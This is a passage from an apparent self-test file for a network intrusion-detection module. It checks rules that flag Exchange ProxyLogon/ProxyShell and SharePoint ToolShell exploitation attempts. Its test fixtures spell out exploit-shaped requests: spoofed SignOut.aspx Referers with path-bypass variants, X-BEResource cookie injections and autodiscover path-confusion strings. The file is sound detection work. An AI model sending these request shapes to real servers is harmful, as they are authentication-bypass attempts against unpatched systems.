             b"/_layouts/SignOut.aspx", b"MSOtlPn_DWP=markup")
    check("HTTP-088 fires on the original CVE-2025-49706 shape",
          "HTTP-088" in _excodes(ts))
    for label, target, referer in [
        ("the trailing-slash 53771 bypass",
         b"/_layouts/15/ToolPane.aspx/", b"/_layouts/SignOut.aspx"),
        ("the SANS-observed PathInfo form",
         b"/_layouts/15/ToolPane.aspx/lx?DisplayMode=Edit&lx=/ToolPane.aspx",
         b"/_layouts/SignOut.aspx"),
        ("the /_layouts/16/ hive",
         b"/_layouts/16/ToolPane.aspx?DisplayMode=Edit",
         b"/_layouts/SignOut.aspx"),
        ("the /_layouts/14/ hive",
         b"/_layouts/14/ToolPane.aspx", b"/_layouts/SignOut.aspx"),
        ("no hive segment at all",
         b"/_layouts/ToolPane.aspx", b"/_layouts/SignOut.aspx"),
        ("a lowercase target",
         b"/_layouts/15/toolpane.aspx", b"/_layouts/SignOut.aspx"),
        ("an uppercase target",
         b"/_LAYOUTS/15/TOOLPANE.ASPX", b"/_layouts/SignOut.aspx"),
        ("the ./SignOut.aspx Referer",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/./SignOut.aspx"),
        ("a dot-dot Referer",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/15/../SignOut.aspx"),
        ("an absolute-URL Referer",
         b"/_layouts/15/ToolPane.aspx",
         b"https://sharepoint.target.internal/_layouts/SignOut.aspx"),
        ("a backslash Referer",
         b"/_layouts/15/ToolPane.aspx", br"\_layouts\SignOut.aspx"),
        ("a %2e Referer", b"/_layouts/15/ToolPane.aspx",
         b"/_layouts/%2e/SignOut.aspx"),
        ("the 14 sign-out path",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/14/SignOut.aspx"),
        ("the 15 sign-out path",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/15/SignOut.aspx"),
        ("a case-variant Referer",
         b"/_layouts/15/ToolPane.aspx", b"/_LAYOUTS/15/signout.ASPX"),
        ("a Referer with a query and fragment",
         b"/_layouts/15/ToolPane.aspx",
         b"/_layouts/SignOut.aspx?ReturnUrl=%2f#x"),
        ("a GET rather than a POST",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/SignOut.aspx"),
    ]:
        raw = _sp(target, referer,
                  method=b"GET" if "GET" in label else b"POST")
        check(f"HTTP-088 fires on {label}", "HTTP-088" in _excodes(raw))


def test_http_088_negatives():
    for label, target, referer in [
        ("a sign-out Referer to init.js",
         b"/_layouts/15/init.js", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to core.js",
         b"/_layouts/15/core.js", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to theming.js",
         b"/_layouts/15/theming.js", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to ScriptResource.axd",
         b"/ScriptResource.axd?d=x", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to WebResource.axd",
         b"/WebResource.axd?d=x", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to corev15.css",
         b"/_layouts/15/1033/styles/corev15.css", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to favicon.ico",
         b"/_layouts/15/images/favicon.ico", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer back to SignOut.aspx itself",
         b"/_layouts/15/SignOut.aspx", b"/_layouts/SignOut.aspx"),
        # ordinary admin web-part editing
        ("ToolPane with an ordinary site Referer",
         b"/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
         b"/sites/x/SitePages/Home.aspx"),
        ("ToolPane with a Referer on another SharePoint page",
         b"/_layouts/15/ToolPane.aspx", b"/_layouts/15/start.aspx"),
        # R2 territory: counted, never alerted
        ("a sign-out Referer to start.aspx",
         b"/_layouts/15/start.aspx", b"/_layouts/SignOut.aspx"),
        ("a sign-out Referer to viewlsts.aspx",
         b"/_layouts/15/viewlsts.aspx", b"/_layouts/SignOut.aspx"),
        # signout.aspx in the Referer's QUERY, not its path
        ("signout.aspx only in the Referer query",
         b"/_layouts/15/ToolPane.aspx",
         b"/sites/x/p.aspx?r=/_layouts/SignOut.aspx"),
        # toolpane.aspx not under _layouts
        ("ToolPane.aspx outside the _layouts hive",
         b"/_other/ToolPane.aspx", b"/_layouts/SignOut.aspx"),
        ("ToolPane.aspx deep under a site",
         b"/sites/x/_catalogs/ToolPane.aspx", b"/_layouts/SignOut.aspx"),
        # a lookalike filename
        ("a ToolPane lookalike name",
         b"/_layouts/15/ToolPane.aspx.bak", b"/_layouts/SignOut.aspx"),
        ("toolpane.aspx as a substring of a longer segment",
         b"/_layouts/15/MyToolPane.aspx", b"/_layouts/SignOut.aspx"),
    ]:
        raw = _sp(target, referer)
        check(f"HTTP-088 silent on {label}", "HTTP-088" not in _excodes(raw))
    check("HTTP-088 silent with no Referer at all",
          "HTTP-088" not in _excodes(_sp(b"/_layouts/15/ToolPane.aspx")))
    check("HTTP-088 silent with an empty Referer",
          "HTTP-088" not in _excodes(
              _sp(b"/_layouts/15/ToolPane.aspx", b"")))


def test_http_088_evidence():
    raw = _sp(b"/_layouts/15/ToolPane.aspx/lx?DisplayMode=Edit&lx=/ToolPane.aspx",
              b"https://sp.corp/_layouts/./SignOut.aspx",
              b"MSOtlPn_DWP=SECRETMARKER&MSOtlPn_Uri=/x",
              extra=b"Cookie: FedAuth=CREDENTIALMARKER\r\n")
    f = [x for x in _ex(raw) if x.code == "HTTP-088"][0]
    e = f.evidence
    check("HTTP-088 reports the canonical target path",
          e["target_path"] == "/_layouts/15/ToolPane.aspx/lx")
    check("HTTP-088 reports the handler path",
          e["handler_path"] == "/_layouts/15/ToolPane.aspx")
    check("HTTP-088 reports the canonical Referer path, host stripped",
          e["referer_path"] == "/_layouts/SignOut.aspx")
    check("HTTP-088 records that the Referer needed canonicalising",
          e["referer_canonicalised"] is True)
    check("HTTP-088 marks the PathInfo bypass form",
          e["pathinfo_suffix"] is True)
    check("HTTP-088 notes DisplayMode=Edit", e["display_mode_edit"] is True)
    check("HTTP-088 notes the DWP parameter", e["dwp_present"] is True)
    check("HTTP-088 records the body length", e["body_length"] > 0)
    check("HTTP-088 records the hive", e["hive"] == "15")
    check("HTTP-088 records that ToolPane is not allowlisted",
          e["allowlisted"] is False)
    blob = repr(e)
    check("HTTP-088 never logs the body", "SECRETMARKER" not in blob)
    check("HTTP-088 never logs FedAuth", "CREDENTIALMARKER" not in blob)
    check("HTTP-088 never logs the Referer host", "sp.corp" not in blob)
    check("HTTP-088 digests the body", e["body_digest"].startswith("sha256:"))
    check("HTTP-088 says every hit is an attempt",
          "attempt" in e["note"] and "patch state is not on the wire"
          in e["note"])
    cfg = hw.WatchConfig(log_attack_payload=True)
    f2 = [x for x in _ex(raw, cfg) if x.code == "HTTP-088"][0]
    check("HTTP-088 logs the body only when asked",
          "SECRETMARKER" in f2.evidence.get("payload", ""))
    check("HTTP-088 still withholds FedAuth when asked",
          "CREDENTIALMARKER" not in repr(f2.evidence))


def test_http_088_request_class():
    post = _sp(b"/_layouts/15/ToolPane.aspx", b"/_layouts/SignOut.aspx")
    get = _sp(b"/_layouts/15/ToolPane.aspx", b"/_layouts/SignOut.aspx",
              method=b"GET")
    fp = [x for x in _ex(post) if x.code == "HTTP-088"][0]
    fg = [x for x in _ex(get) if x.code == "HTTP-088"][0]
    check("HTTP-088 classes a POST critical",
          fp.evidence["request_class"] == "critical")
    check("HTTP-088 classes other methods high",
          fg.evidence["request_class"] == "high")


def test_http_088_r2_counter_only():
    """R2 is a counter, never an alert: administrators can extend the
    July 20 allowlist, so a sign-out Referer to some other page cannot be
    zero-FP."""
    w = hw.HttpWatch()
    for target in [b"/_layouts/15/start.aspx", b"/_layouts/15/viewlsts.aspx",
                   b"/_layouts/15/settings.aspx"]:
        out = w.feed("x", "10.0.0.5", "10.0.0.9", 80,
                     _sp(target, b"/_layouts/SignOut.aspx"), True, now=1.0)
        check(f"R2 never alerts on {target!r}",
              not any(f.code == "HTTP-088" for f in out))
    check("R2 counts the non-allowlisted sign-out referrals",
          w.stats["toolshell_signout_nonallowlisted"] == 3)
    # allowlisted resources are not even counted
    w2 = hw.HttpWatch()
    w2.feed("x", "10.0.0.5", "10.0.0.9", 80,
            _sp(b"/_layouts/15/init.js", b"/_layouts/SignOut.aspx"), True,
            now=1.0)
    check("R2 does not count allowlisted resources",
          w2.stats["toolshell_signout_nonallowlisted"] == 0)
    # and a non-.aspx is not counted either
    w3 = hw.HttpWatch()
    w3.feed("x", "10.0.0.5", "10.0.0.9", 80,
            _sp(b"/_layouts/15/custom.js", b"/_layouts/SignOut.aspx"), True,
            now=1.0)
    check("R2 only counts .aspx pages",
          w3.stats["toolshell_signout_nonallowlisted"] == 0)
    check("the July 20 allowlist is pinned at 12 entries",
          len(hw.SHAREPOINT_SIGNOUT_ALLOWLIST) == 12)
    check("ToolPane.aspx is not on the allowlist",
          not any(b"toolpane" in p for p in hw.SHAREPOINT_SIGNOUT_ALLOWLIST))


def test_exchange_sharepoint_dedup():
    """All three codes are attack-class, so they rate-limit per client."""
    for code in ("HTTP-086", "HTTP-087", "HTTP-088"):
        check(f"{code} is attack-class for dedup", code in hw.ATTACK_CODES)
    w = hw.HttpWatch()
    raw = _sp(b"/_layouts/15/ToolPane.aspx", b"/_layouts/SignOut.aspx")
    first = w.feed("a", "10.0.0.5", "10.0.0.9", 80, raw, True, now=1.0)
    second = w.feed("b", "10.0.0.5", "10.0.0.9", 80, raw, True, now=2.0)
    check("HTTP-088 reports the first hit",
          any(f.code == "HTTP-088" for f in first))
    check("HTTP-088 suppresses the repeat",
          not any(f.code == "HTTP-088" for f in second))
    check("HTTP-088 counts the suppression", w.stats["attacks_suppressed"] >= 1)
    # a different code on the same pair still reports
    third = w.feed("c", "10.0.0.5", "10.0.0.9", 80,
                   _cookie_req(b"X-BEResource=localhost/ecp/x.ecp#~1"),
                   True, now=3.0)
    check("dedup is per code, so HTTP-086 still reports",
          any(f.code == "HTTP-086" for f in third))


def test_exchange_sharepoint_registry():
    for code, tier, cves in [
        ("HTTP-086", "E", {"CVE-2021-26855"}),
        ("HTTP-087", "F", {"CVE-2021-34473", "CVE-2022-41040"}),
        ("HTTP-088", "E", {"CVE-2025-49706", "CVE-2025-53771"}),
    ]:
        d = hw.FINDING_REGISTRY[code]
        check(f"{code} is tier {tier}", d.tier == tier)
        check(f"{code} is critical", d.severity == "critical")
        check(f"{code} is exact-confidence", d.confidence == "exact")
        check(f"{code} carries its CVEs", set(d.cves) == cves)
    # the chained CVEs that are deliberately NOT walked
    for cve in ("CVE-2021-27065", "CVE-2021-31207", "CVE-2022-41082",
                "CVE-2022-41080", "CVE-2021-34523"):
        check(f"{cve} is recorded as deferred", cve in hw.DEFERRED_CVES)
    check("OWASSRF is deferred with a reason",
          len(hw.DEFERRED_CVES["CVE-2022-41080"]) > 20)
    check("CVE-2025-53770 is in the catalog as the chain terminus",
          hw.CVE_CATALOG["CVE-2025-53770"]["score"] == 9.8)



def test_exchange_sharepoint_h2c():
    """The three rules read only headers and the request line, so the h2c
    path runs them too.

    This is deliberate over-approximation, not a claimed shape: IIS
    supports HTTP/2 only over TLS and falls back to HTTP/1.1 in the clear,
    so an Exchange or SharePoint offload leg cannot be h2c. It costs
    nothing and covers a non-IIS front end or proxy in the path.
    """
    def drive_h2(fields, from_client=True):
        st = hw.H2ConnectionState("h2x", synced=True)
        blk = b"".join(_hpack_literal(n, v) for n, v in fields)
        return st.feed([hw.H2Frame(len(blk), hw.FRAME_HEADERS,
                                   hw.FLAG_END_HEADERS, 1, blk)],
                       from_client=from_client, now=1.0)

    # --- HTTP-086 over decoded HPACK
    out = drive_h2([(b":method", b"POST"), (b":path", b"/ecp/favicon.ico"),
                    (b":authority", b"exch.corp"),
                    (b"cookie", b"X-BEResource=@backend.example.local:444"
                                b"/ecp/proxyLogon.ecp#~1941962753")])
    check("HTTP-086 h2c: fires on a decoded cookie field",
          "HTTP-086" in codes(out))
    hit = [f for f in out if f.code == "HTTP-086"]
    check("HTTP-086 h2c: reports the injected path",
          hit and hit[0].evidence["target_path"] == "/ecp/proxyLogon.ecp")
    out = drive_h2([(b":method", b"GET"), (b":path", b"/owa/x.js"),
                    (b"cookie", b"X-BEResource=EXCH01~1942062522")])
    check("HTTP-086 h2c: silent on a legitimate back-end cookie",
          "HTTP-086" not in codes(out))

    # --- HTTP-087 over decoded HPACK
    out = drive_h2([(b":method", b"GET"), (b":authority", b"exch.corp"),
                    (b":path", b"/autodiscover/autodiscover.json?@evil.corp/?"
                               b"&Email=autodiscover/autodiscover.json%3F"
                               b"@evil.corp")])
    check("HTTP-087 h2c: fires on the strip construct in :path",
          "HTTP-087" in codes(out))
    out = drive_h2([(b":method", b"GET"), (b":authority", b"exch.corp"),
                    (b":path", b"/autodiscover/autodiscover.json?Email="
                               b"user@contoso.com&Protocol=ActiveSync")])
    check("HTTP-087 h2c: silent on a legitimate autodiscover request",
          "HTTP-087" not in codes(out))

    # --- HTTP-088 over decoded HPACK, with the body honestly absent
    out = drive_h2([(b":method", b"POST"), (b":authority", b"sp.corp"),
                    (b":path", b"/_layouts/15/ToolPane.aspx?DisplayMode=Edit"),
                    (b"referer", b"/_layouts/./SignOut.aspx")])
    check("HTTP-088 h2c: fires on :path plus a decoded referer",
          "HTTP-088" in codes(out))
    hit = [f for f in out if f.code == "HTTP-088"]
    e = hit[0].evidence if hit else {}
    check("HTTP-088 h2c: canonicalises the referer from HPACK",
          e.get("referer_path") == "/_layouts/SignOut.aspx")
    # DATA frames reach no body sink, so the body attributes must say
    # "not seen" rather than reading as a negative
    check("HTTP-088 h2c: says outright that the body was not visible",
          e.get("body_visible") is False)
    check("HTTP-088 h2c: dwp_present is null, not False",
          e.get("dwp_present") is None)
    check("HTTP-088 h2c: body_length is null, not 0",
          e.get("body_length") is None)
    check("HTTP-088 h2c: no body digest is claimed",
          e.get("body_digest") is None)
    out = drive_h2([(b":method", b"GET"), (b":authority", b"sp.corp"),
                    (b":path", b"/_layouts/15/init.js"),
                    (b"referer", b"/_layouts/SignOut.aspx")])
    check("HTTP-088 h2c: silent on an allowlisted resource",
          "HTTP-088" not in codes(out))

    # --- the server direction is not a request, so none of them run
    out = drive_h2([(b":status", b"200"),
                    (b"cookie", b"X-BEResource=localhost/ecp/x.ecp#~1")],
                   from_client=False)
    check("the Exchange rules do not run on the server direction",
          not ({"HTTP-086", "HTTP-087", "HTTP-088"} & set(codes(out))))

    # --- and end to end through the analyzer over h2c prior knowledge
    w = hw.HttpWatch()
    w.feed("e2eх", "10.0.0.1", "10.0.0.2", 8080, hw.H2_PREFACE, True, now=1.0)
    blk = (_hpack_literal(b":method", b"POST")
           + _hpack_literal(b":authority", b"sp.corp")
           + _hpack_literal(b":path", b"/_layouts/15/ToolPane.aspx/")
           + _hpack_literal(b"referer", b"/_layouts/SignOut.aspx"))
    frame = _h2_frame_bytes(hw.FRAME_HEADERS, hw.FLAG_END_HEADERS, 1, blk)
    out = w.feed("e2eх", "10.0.0.1", "10.0.0.2", 8080, frame, True, now=1.0)
    check("HTTP-088 h2c: reaches the analyzer end to end",
          "HTTP-088" in codes(out))

    # --- the HTTP/1.x path still reports the body, so the refactor did not
    #     quietly turn body_visible off everywhere
    one = _ex(_sp(b"/_layouts/15/ToolPane.aspx", b"/_layouts/SignOut.aspx",
                  b"MSOtlPn_DWP=x"))
    f1 = [f for f in one if f.code == "HTTP-088"][0]
    check("HTTP-088 over HTTP/1.x still sees the body",
          f1.evidence["body_visible"] is True
          and f1.evidence["dwp_present"] is True
          and f1.evidence["body_length"] > 0)


def test_record_shape():
    f = hw.make_finding("HTTP-045", {"target": "/x"})
    rec = hw.finding_record(f)
    for key in ("module", "version", "type", "status", "timestamp", "findings"):
        check(f"record: has {key}", key in rec)
    check("record: module name", rec["module"] == "httpwatch")
    check("record: findings carry code", rec["findings"][0]["code"] == "HTTP-045")
    import json
    check("record: json serialisable", isinstance(json.dumps(rec), str))


def main():
    for fn in sorted([v for k, v in globals().items() if k.startswith("test_")],
                     key=lambda f: f.__code__.co_firstlineno):
        fn()
    print(f"\n{PASS}/{PASS + FAIL} self-test checks passed")
    if FAILURES:
        print("\nfailures:")
        for f in FAILURES:
            print("  " + f)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
